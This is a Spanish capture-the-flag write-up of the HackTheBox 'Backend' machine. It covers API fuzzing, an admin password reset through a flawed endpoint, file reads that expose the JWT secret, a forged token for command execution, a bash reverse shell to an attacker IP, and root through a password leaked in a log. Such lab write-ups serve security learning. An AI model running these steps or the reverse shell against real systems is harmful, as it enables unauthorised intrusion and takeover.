---
layout: single
title: Backend HTB - WriteUp
excerpt: WriteUp de la máquina Backend de HTB.
date: 2023-03-09
classes: wide
header:
  teaser: /assets/images/Backend/Backend.png
  teaser_home_page: true
  icon: /assets/images/Backend/Backend.png
categories:
  - infosec
tags:
  - ctf
  - Linux                         
  - Writeup
  - Web-Enumeration
  - Web-Fuzzing
  - API
  - Read-Logs                       
---


En el día de hoy estaremos resolviendo la máquina Bacckend de HackTheBox. Es una máquina Linux y su dirección IP es 10.10.11.161.

### Índice

1. [Enumeración Inicial](#enumeración-inicial)
2. [API Enumeration](#api-enumeration)
	1. [API Register User](#api-register-user)
	2. [API Login User](#api-login-user)
	3. [Reading API Doc](#reading-api-doc)
3. [Reset Admin Password](#reset-admin-password)
4. [Failed RCE](#failed-rce)
5. [API Read Files](#api-read-files)
6. [API Execc Commands](#api-execc-commands)
7. [Privesc](#privesc)

### Enumeración Inicial

Lo primero que haremos será una enumeración de los servicios expuestos que tiene la máquina. Para esa tarea usaremos nmap.

```bash
# Nmap 7.91 scan initiated Thu Mar  9 11:24:05 2023 as: nmap -sC -sV -Pn -oN Extraction -p22,80 10.10.11.161
Nmap scan report for 10.10.11.161
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    uvicorn
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     content-type: text/plain; charset=utf-8
|     Connection: close
|     Invalid HTTP request received.
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     date: Thu, 09 Mar 2023 14:35:09 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 200 OK
|     date: Thu, 09 Mar 2023 14:34:57 GMT
|     server: uvicorn
|     content-length: 29
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC API Version 1.0"}
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     date: Thu, 09 Mar 2023 14:35:03 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
|_http-server-header: uvicorn
|_http-title: Site doesn't have a title (application/json).
# Nmap done at Thu Mar  9 11:25:17 2023 -- 1 IP address (1 host up) scanned in 71.99 seconds
```

Podemos ver abiertos el puerto del servicio SSH (22) y un servidor HTTP (80). Vamos a acceder al servidor HTTP para ver que nos encontramos.

```bash
❯ curl -s  "http://10.10.11.161/" | jq
{
  "msg": "UHC API Version 1.0"
}
```

Parece que estamos ante una API. Vamos a ver las cabeceras del servidor.

```bash
❯ curl -I http://10.10.11.161/
HTTP/1.1 405 Method Not Allowed
date: Thu, 09 Mar 2023 14:39:17 GMT
server: uvicorn
content-length: 31
content-type: application/json
```

Vemos que el metodo no esta permtido... Bueno, no tenemos mucha mas información. Vamos a empezar a enumerar la API. Lo primero que haremos sera buscar FUZZEAR en busca de endpoints. Para esa tarea podemos usar wffuzz, ffuf, gobuster... etc. En mi caso voy a usar ffuf.

### API Enumeration

Vamos a empezar a fuzzear utilizando el metodo GET, recordemos que una API puede soportar varios metodos y puede que haya endpoints que solo puedan ser accesibles desde un metodo.

```bash
❯ ffuf -t 50 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -fw 4 -c -u 'http://10.10.11.161/FUZZ'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.161/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

docs                    [Status: 401, Size: 30, Words: 2, Lines: 1, Duration: 56ms]
api                     [Status: 200, Size: 20, Words: 1, Lines: 1, Duration: 77ms]
```

Vemos que hay doy directorios, un endpoint que se llama "doc" que podría ser la documentación de la API y otro enpoint que es "api" que puede ser de donde cuelgen todos los enpoints de la API.

Si intentamos acceder a la documentación, vemos que nos hace falta estar autenticados.

```bash
❯ curl -i http://10.10.11.161/docs
HTTP/1.1 401 Unauthorized
date: Thu, 09 Mar 2023 14:51:17 GMT
server: uvicorn
www-authenticate: Bearer
content-length: 30
content-type: application/json

{"detail":"Not authenticated"}
```

El endpoint "api" nos reporta la siguiente información.

```bash
❯ curl -s  http://10.10.11.161/api | jq
{
  "endpoints": [
    "v1"
  ]
}
```

Nos reporta el endpoint "v1", vamos a ver que nos reporta al acceder a él.

```bash
❯ curl -s  http://10.10.11.161/api/v1 | jq
{
  "endpoints": [
    "user",
    "admin"
  ]
}
```

Mas endpoints... Accederemos a user, un endpoint llamado así suele reportar los usuarios existentes.

```bash
❯ curl -s  http://10.10.11.161/api/v1/user/ | jq
{
  "detail": "Not Found"
}
```

No reporta nada... pero es bastante común que necesite un identificador para acceder a lun usuario.

```bash
❯ curl -s  http://10.10.11.161/api/v1/user/1 | jq
{
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "email": "admin@htb.local",
  "date": null,
  "time_created": 1649533388111,
  "is_superuser": true,
  "id": 1
}
```

Hemos extraido información del usuario administrador... Si probamos fuzzear para buscar mas usuarios no enccontraremos ninguno más. Recordemos que teniamos un endpoint "admin" vamos a intentar accceder a él.

```bash
❯ curl -s  http://10.10.11.161/api/v1/admin/ | jq
{
  "detail": "Not authenticated"
}
```

No podemos, en este punto nos toca seguir fuzzeando la API.

```bash
❯ wfuzz -X POST --hc=405 -u "http://10.10.11.161/api/v1/user/FUZZ" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.161/api/v1/user/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================
                                                                                                                       
000000053:   422        0 L      3 W        172 Ch      "login"                                                                                                                     
000000217:   422        0 L      2 W        81 Ch       "signup"
```

### API Register User

Después de un rato fuzzeando, podemos encontrar dos funciones que podemos ejecutar con POST. Vamos a intentar crear un usuario y iniciar sesión con él. 

Lo primero que haremos será crear un usuario. 

```bash
❯ curl  -X POST -s  http://10.10.11.161/api/v1/user/signup -H 'Content-Type: application/json' -d '{"username":"bertranuco","password":"Testing123!"}'
{"detail":[{"loc":["body","email"],"msg":"field required","type":"value_error.missing"}]}
```

Esto nos está chivando que nos falta en el body el ccampo email.

```bash
❯ curl  -X POST -s  http://10.10.11.161/api/v1/user/signup -H 'Content-Type: application/json' -d '{"username":"bertranuco","password":"Testing123!","email":"bertranuco@bly.com"}'
{}
```


### API Login User

Parece que hemos registrado un usuario, vamos a intentar loggearnos.

```bash
 curl  -X POST -s  http://10.10.11.161/api/v1/user/login -H 'Content-Type: application/json' -d '{"username":"bertranuco","password":"Testing123!"}'
{"detail":[{"loc":["body","username"],"msg":"field required","type":"value_error.missing"},{"loc":["body","password"],"msg":"field required","type":"value_error.missing"}]}
```

No nos está dejando... vamos a cambiar la forma de enviar los datos.

```bash
❯ curl  -X POST -s  http://10.10.11.161/api/v1/user/login -d 'username=bertranuco&password=Testing123!'
{"detail":"Incorrect username or password"}

❯ curl  -X POST -s  http://10.10.11.161/api/v1/user/login -d 'username=bertranuco@bly.com&password=Testing123!'
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjc5MDY4ODQwLCJpYXQiOjE2NzgzNzc2NDAsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiMDkzODI0MjctZjBkNC00YTRkLTg3MWMtNzFjYmVhNGQ1YmUzIn0.HOz9ZxYxEZo9wfp2iv47twVdqHaTTcQQMSblTiq0TUk","token_type":"bearer"}
```

Hemos conseguido iniciar sesión en la aplicación. Vamos a ver si podemos acceder a la documentación de la API.

![](/assets/images/Backend/img1.png)

### Reading API Doc

Ya podemos acceder a la documentación de la API. Vamos a configurar que se añada la cabecera por defecto, de esta forma podemos verla desde el navegador.

![](/assets/images/Backend/img2.png)


Vemos que tenemos un endpoint que nos permite hacer un update de una password, vamos a ver si tenemos permisos para hacerlo.

![](/assets/images/Backend/img3.png)


Nos hace falta el guid del administrador, esto lo obtuvimos anteriormente.

```bash
❯ curl -s  http://10.10.11.161/api/v1/user/1 | jq
{
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "email": "admin@htb.local",
  "date": null,
  "time_created": 1649533388111,
  "is_superuser": true,
  "id": 1
}
```


### Reset Admin Password

Vamos a probar a cambiarle la password al administrador.

![](/assets/images/Backend/img4.png)

La respuesta es la siguiente:

```json
{ "date": null, "id": 1, "is_superuser": true, "hashed_password": "$2b$12$KONhC5XBwXMVMLsXyTSZuuFgcNkwfAFYtkyAXTKzQBB/ncO42gq4W", "guid": "36c2e94a-4271-4259-93bf-c96ad5948284", "email": "admin@htb.local", "time_created": 1649533388111, "last_update": null }
```

¿Se ha cambiado la password?  Vamos a intentar autenticarnos.

```bash
❯ curl -X POST "http://10.10.11.161/api/v1/user/login" -d 'username=admin@htb.local&password=Testing123!'
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjc5MDY5Nzk5LCJpYXQiOjE2NzgzNzg1OTksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.tySHpIHjopPp7Gf8QKz2JZFxOTNcMcXY87VQibL5yxg","token_type":"bearer"}
```

Hacemos lo mismo que antes... En el burpsuite sustituimos el token para verlo desde el navegador.

![](/assets/images/Backend/img5.png)

### Failed RCE

Ya somos administradores de la aplicación web. Podemos ver que hay un endpoint que nos permite ejecutar comandos y otra que nos permite leer archivos. Si intentamos ejecutar comandos veremos que no podemos.

```bash
❯ curl -X GET "http://10.10.11.161/api/v1/admin/exec/id" -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjc5MDY5Nzk5LCJpYXQiOjE2NzgzNzg1OTksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.tySHpIHjopPp7Gf8QKz2JZFxOTNcMcXY87VQibL5yxg'
{"detail":"Debug key missing from JWT"}
```

El token es un JWT y el mensaje nos indica que falta la key debug en el token.

![](/assets/images/Backend/img6.png)


### API Read Files

Nos hace falta el secreto para crear nuestro propio token, como tenemos la capaccidad de leer archivos, podemos intentar buscar el código de la aplicación.

Vamos a leer el passwd.

```bash
❯ curl -X 'POST' \
  'http://10.10.11.161/api/v1/admin/file' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjc5MDcwMDQ5LCJpYXQiOjE2NzgzNzg4NDksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.xv1AsEd_3Q-Mz67kkvAT3XHy-x5XphoeqWpFqE0WbQU' \
  -H 'Content-Type: application/json' \
  -d '{
  "file": "/etc/passwd"
}';echo
```

El resultado parseado es el siguiente:

```json
{
 "file":"root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin htb:x:1000:1000:htb:/home/htb:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false"
}
```

Podemos intentar leer el /proc/self/environ

```bash
❯ curl -X 'POST' \
  'http://10.10.11.161/api/v1/admin/file' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjc5MDcwMDQ5LCJpYXQiOjE2NzgzNzg4NDksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.xv1AsEd_3Q-Mz67kkvAT3XHy-x5XphoeqWpFqE0WbQU' \
  -H 'Content-Type: application/json' \
  -d '{
  "file": "/proc/self/environ"
}';echo
{

-   "file":"APP_MODULE=app.main:appPWD=/home/htb/uhcLOGNAME=htbPORT=80HOME=/home/htbLANG=C.UTF-8VIRTUAL_ENV=/home/htb/uhc/.venvINVOCATION_ID=60c6ab9404db41d49893ef2e13ef0ad9HOST=0.0.0.0USER=htbSHLVL=0PS1=(.venv) JOURNAL_STREAM=9:18003PATH=/home/htb/uhc/.venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binOLDPWD=/"

}
```

>  /proc/self/environ contiene variables de entorno en este caso tiene la ruta de la aplicación web.

"APP_MODULE=app.main" no indica que hay una carpeta app que contiene un archivo main.py, podemos saber que es .py porque la app revela en las cabeceras uvicorn

```bash
❯ curl -i http://10.10.11.161/api
HTTP/1.1 200 OK
date: Thu, 09 Mar 2023 17:00:25 GMT
server: uvicorn
```


Vamos a leer el archivo .py

```bash
❯ curl -X 'POST' \
  'http://10.10.11.161/api/v1/admin/file' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjc5MDcwMDQ5LCJpYXQiOjE2NzgzNzg4NDksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.xv1AsEd_3Q-Mz67kkvAT3XHy-x5XphoeqWpFqE0WbQU' \
  -H 'Content-Type: application/json' \
  -d '{
  "file": "/home/htb/uhc/app/main.py"
}';echo

{

"file":"import asyncio from fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends from fastapi_contrib.common.responses import UJSONResponse from fastapi import FastAPI, Depends, HTTPException, status from fastapi.security import HTTPBasic, HTTPBasicCredentials from fastapi.openapi.docs import get_swagger_ui_html from fastapi.openapi.utils import get_openapi from typing import Optional, Any from pathlib import Path from sqlalchemy.orm import Session from app.schemas.user import User from app.api.v1.api import api_router from app.core.config import settings from app import deps from app import crud app = FastAPI(title="UHC API Quals", openapi_url=None, docs_url=None, redoc_url=None) root_router = APIRouter(default_response_class=UJSONResponse) @app.get("/", status_code=200) def root(): """ Root GET """ return {"msg": "UHC API Version 1.0"} @app.get("/api", status_code=200) def list_versions(): """ Versions """ return {"endpoints":["v1"]} @app.get("/api/v1", status_code=200) def list_endpoints_v1(): """ Version 1 Endpoints """ return {"endpoints":["user", "admin"]} @app.get("/docs") async def get_documentation( current_user: User = Depends(deps.parse_token) ): return get_swagger_ui_html(openapi_url="/openapi.json", title="docs") @app.get("/openapi.json") async def openapi( current_user: User = Depends(deps.parse_token) ): return get_openapi(title = "FastAPI", version="0.1.0", routes=app.routes) app.include_router(api_router, prefix=settings.API_V1_STR) app.include_router(root_router) def start(): import uvicorn uvicorn.run(app, host="0.0.0.0", port=8001, log_level="debug") if __name__ == "__main__": # Use this for debugging purposes only import uvicorn uvicorn.run(app, host="0.0.0.0", port=8001, log_level="debug") "
}
```

Podemos ver que se hacen importaciones de librerias como "import api_router from app.core.config" Estas llibrerias no son las tipicas como pueden ser "sys,os" etc. Son de desarrollo propio y se pueden acceder a ellas. app.core.config significa que dentro de la carpeta app/core hay un archivo config.py vamos a leerlo.

```bash
❯ curl -X 'POST' \
  'http://10.10.11.161/api/v1/admin/file' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjc5MDcwMDQ5LCJpYXQiOjE2NzgzNzg4NDksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.xv1AsEd_3Q-Mz67kkvAT3XHy-x5XphoeqWpFqE0WbQU' \
  -H 'Content-Type: application/json' \
  -d '{
  "file": "/home/htb/uhc/app/core/config.py"
}';echo

{"file":"from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator\nfrom typing import List, Optional, Union\n\nfrom enum import Enum\n\n\nclass Settings(BaseSettings):\n    API_V1_STR: str = \"/api/v1\"\n    JWT_SECRET: str = \"SuperSecretSigningKey-HTB\"\n    ALGORITHM: str = \"HS256\"\n\n    # 60 minutes * 24 hours * 8 days = 8 days\n    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8\n\n    # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins\n    # e.g: '[\"http://localhost\", \"http://localhost:4200\", \"http://localhost:3000\", \\\n    # \"http://localhost:8080\", \"http://local.dockertoolbox.tiangolo.com\"]'\n    BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = []\n\n    @validator(\"BACKEND_CORS_ORIGINS\", pre=True)\n    def assemble_cors_origins(cls, v: Union[str, List[str]]) -> Union[List[str], str]:\n        if isinstance(v, str) and not v.startswith(\"[\"):\n            return [i.strip() for i in v.split(\",\")]\n        elif isinstance(v, (list, str)):\n            return v\n        raise ValueError(v)\n\n    SQLALCHEMY_DATABASE_URI: Optional[str] = \"sqlite:///uhc.db\"\n    FIRST_SUPERUSER: EmailStr = \"root@ippsec.rocks\"    \n\n    class Config:\n        case_sensitive = True\n \n\nsettings = Settings()\n"}
```

### API Exec Commands


Podemos ver el secreto "SuperSecretSigningKey-HTB", ahora podemos crear nuestro propio JWT.

![](/assets/images/Backend/img7.png)

Ya podemos ejecutar comandos a nivel de sistema:

```bash
❯ curl -X GET "http://10.10.11.161/api/v1/admin/exec/id" -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjc5MDY5Nzk5LCJpYXQiOjE2NzgzNzg1OTksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6IjEifQ.IJL3Nl4aVoG-wbiZA54YarQjtXBhCrHRHX9iXU4gNys';echo
"uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)"
```

Ahora tendremos que establecernos una revshell.

```bash
❯ echo "bash -c 'bash -i >& /dev/tcp/10.10.16.6/443 0>&1'" | base64 -w0
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42LzQ0MyAwPiYxJwo=
```

Usaremos ese payload, lo tenemos codificar en formato URL para que funcione.

![](/assets/images/Backend/img8.png)

### Privesc

Si miramos nuestro listener, podemos ver que tenemos shell. Ahora tendriamos que hacer el tratamiento de la tty.


```bash
❯ nc -lvvp 443
listening on [any] 443 ...
^B210.10.11.161: inverse host lookup failed: Unknown host
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.161] 51010
bash: cannot set terminal process group (670): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

htb@backend:~/uhc$
```

Si miramos los grupos a los que pertenece podemos ver que estamos en el grupo lxd:

```bash
htb@backend:~/uhc$ id
uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
```

Si estamos en el grupo lxd podemos escalar privilegios creando un contendor. Para ello podemos seguir este tutorial: https://www.hackingarticles.in/lxd-privilege-escalation/

Por desgracia lxc no está instalado en el sistema. Por lo tanto vamos a seguir enumerando.
Si accedemos a la carpeta donde esta montada toda la App Web podemos ver un fichero llamado auth.log

```bash
htb@backend:~/uhc$ cat auth.log 
03/09/2023, 13:10:22 - Login Success for admin@htb.local
03/09/2023, 13:13:42 - Login Success for admin@htb.local
03/09/2023, 13:27:02 - Login Success for admin@htb.local
03/09/2023, 13:30:22 - Login Success for admin@htb.local
03/09/2023, 13:35:22 - Login Success for admin@htb.local
03/09/2023, 13:38:42 - Login Success for admin@htb.local
03/09/2023, 13:52:02 - Login Success for admin@htb.local
03/09/2023, 14:00:22 - Login Success for admin@htb.local
03/09/2023, 14:02:02 - Login Success for admin@htb.local
03/09/2023, 14:08:42 - Login Success for admin@htb.local
03/09/2023, 14:17:02 - Login Failure for Tr0ub4dor&3
03/09/2023, 14:18:37 - Login Success for admin@htb.local
03/09/2023, 14:18:42 - Login Success for admin@htb.local
03/09/2023, 14:19:02 - Login Success for admin@htb.local
03/09/2023, 14:20:22 - Login Success for admin@htb.local
03/09/2023, 14:25:22 - Login Success for admin@htb.local
03/09/2023, 14:32:02 - Login Success for admin@htb.local
03/09/2023, 16:00:05 - Login Failure for bertranuco
03/09/2023, 16:00:34 - Login Failure for bertranuco
03/09/2023, 16:00:39 - Login Success for bertranuco@bly.com
03/09/2023, 16:16:39 - Login Success for admin@htb.local
03/09/2023, 16:20:49 - Login Success for admin@htb.local
```

Podemos ver un Login fallido por "Tr0ub4dor&3" parece una contraseña. Si la probamos con el usuario actual, veremos que no sirve. En el caso de que la probemos con root ocurre lo siguiente

```bash
htb@backend:~/uhc$ su -
Password: 
root@backend:~# id
uid=0(root) gid=0(root) groups=0(root)
root@backend:~# 
```

Ya hemos pwneado la máquina. Espero que te haya servido.